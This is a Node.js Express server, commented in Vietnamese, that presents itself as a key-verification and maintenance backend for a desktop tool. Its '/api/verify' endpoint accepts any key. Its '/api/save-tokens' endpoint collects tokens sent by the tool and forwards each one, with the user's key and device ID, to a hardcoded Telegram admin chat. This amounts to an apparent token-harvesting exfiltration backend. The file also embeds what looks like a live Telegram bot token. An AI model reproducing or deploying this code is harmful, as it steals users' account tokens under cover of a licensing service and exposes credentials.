const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

// Cấu hình CORS mở rộng: Cho phép mọi yêu cầu từ Web và File .EXE (giao thức file://, app://)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json());

// CẤU HÌNH BÀI VIẾT TELEGRAM
const TELEGRAM_TOKEN = "8326965315:AAGx_Byqs3qaD8tXevZY8dl8K3ogvMV3l-Y"; // Thay Token Bot Telegram tại đây
const ADMIN_ID = 8377928865; // Thay bằng ID Telegram Admin của bạn

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Khai báo biến lưu trữ tạm thời
let globalTokens = [];
let isMaintenanceMode = false;
let maintenanceMsg = "HỆ THỐNG ĐANG BẢO TRÌ ĐỂ CẬP NHẬT!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";

// ----------------------------------------------------
// API 1: KIỂM TRA TRẠNG THÁI BẢO TRÌ TỪ XA
// ----------------------------------------------------
app.get('/api/status', (req, res) => {
    return res.json({
        isMaintenance: isMaintenanceMode,
        message: maintenanceMsg
    });
});

// ----------------------------------------------------
// API 2: XÁC THỰC KEY VÀ MÃ THIẾT BỊ (HWID)
// ----------------------------------------------------
app.get('/api/verify', (req, res) => {
    const { key, deviceId } = req.query;

    if (isMaintenanceMode) {
        return res.json({ success: false, isMaintenance: true, message: maintenanceMsg });
    }

    if (!key) {
        return res.json({ success: false, message: "Vui lòng nhập Key!" });
    }

    // Thời gian hết hạn mặc định (24 giờ kể từ lúc đăng nhập)
    const expireAt = Date.now() + (24 * 60 * 60 * 1000);

    return res.json({
        success: true,
        isMaintenance: false,
        key: key,
        deviceId: deviceId,
        expireAt: expireAt,
        message: "Xác thực Key thành công!"
    });
});

// ----------------------------------------------------
// API 3: NHẬN TOKEN TỪ TOOL (HOẠT ĐỘNG TỐT TRÊN EXE)
// ----------------------------------------------------
app.post('/api/save-tokens', async (req, res) => {
    try {
        const { key, deviceId, tokens } = req.body;

        if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
            return res.status(400).json({ success: false, message: "Không tìm thấy token nào trong yêu cầu!" });
        }

        const validTokens = tokens.map(t => t.trim()).filter(t => t !== "");

        if (validTokens.length === 0) {
            return res.status(400).json({ success: false, message: "Danh sách Token rỗng!" });
        }

        // Cập nhật Token vào bộ nhớ Server
        globalTokens = validTokens;

        // Gửi thông báo Token về Telegram Admin
        let msg = `📥 **NHẬN TOKEN MỚI TỪ TOOL**\n`;
        msg += `🔑 Key: \`${key || 'Không có'}\`\n`;
        msg += `📱 HWID: \`${deviceId || 'Không có'}\`\n`;
        msg += `📊 Số lượng: **${validTokens.length} Token**\n\n`;
        msg += `📋 **Danh sách Token:**\n`;

        validTokens.forEach((tk, idx) => {
            msg += `${idx + 1}. \`${tk}\`\n`;
        });

        await bot.sendMessage(ADMIN_ID, msg, { parse_mode: 'Markdown' });

        return res.json({ success: true, message: "Đã lưu và gửi Token về Bot thành công!" });

    } catch (error) {
        console.error("Lỗi xử lý /api/save-tokens:", error);
        return res.status(500).json({ success: false, message: "Lỗi Server nội bộ!" });
    }
});

// ----------------------------------------------------
// BOT TELEGRAM COMMANDS
// ----------------------------------------------------

// Lệnh kiểm tra danh sách Token hiện có
bot.onText(/\/listtokens/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    if (globalTokens.length === 0) {
        return bot.sendMessage(ADMIN_ID, "⚠️ Hiện chưa có Token nào trong hệ thống (Hoặc Server vừa khởi động lại).");
    }

    let text = `📋 **DANH SÁCH TOKEN HIỆN CÓ (${globalTokens.length}):**\n\n`;
    globalTokens.forEach((tk, i) => {
        text += `${i + 1}. \`${tk}\`\n`;
    });

    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' });
});

// Lệnh bật/tắt bảo trì từ xa (/baotri on hoặc /baotri off)
bot.onText(/\/baotri (.+)/, (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;
    const action = match[1].toLowerCase().trim();

    if (action === "on") {
        isMaintenanceMode = true;
        bot.sendMessage(ADMIN_ID, "🔒 Đã BẬT chế độ bảo trì. Toàn bộ Tool sẽ bị khóa!");
    } else if (action === "off") {
        isMaintenanceMode = false;
        bot.sendMessage(ADMIN_ID, "🔓 Đã TẮT chế độ bảo trì. Người dùng có thể sử dụng Tool bình thường.");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server đang chạy tại Cổng ${PORT}...`);
});
